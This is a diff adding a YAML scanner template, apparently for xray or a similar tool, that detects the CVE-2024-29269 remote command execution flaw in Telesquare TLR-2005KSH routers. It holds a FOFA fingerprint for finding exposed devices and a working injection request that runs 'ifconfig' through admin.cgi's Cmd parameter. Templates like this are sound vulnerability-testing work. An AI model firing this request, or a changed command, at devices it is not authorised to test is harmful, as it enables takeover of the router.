@@ -1,0 +1,16 @@
+id: poc-yaml-telesquare-admin-cgi-rce
+info:
+  name: Telesquare admin.cgi 远程代码执行漏洞(CVE-2024-29269)
+  severity: critical
+  tags:
+  - rce
+  - CVE-2024-29269
+  finger: telesquare
+  fofa: title="Login to TLR-2005KSH"
+requests:
+- method: GET
+  path: /cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig
+  expression: status_code == 200 && contains(body,"<CmdResult>") && contains(body,"Ethernet")
+    && contains(body,"inet") && contains(content_type,"text/xml")
+variables: {}
+transport: http
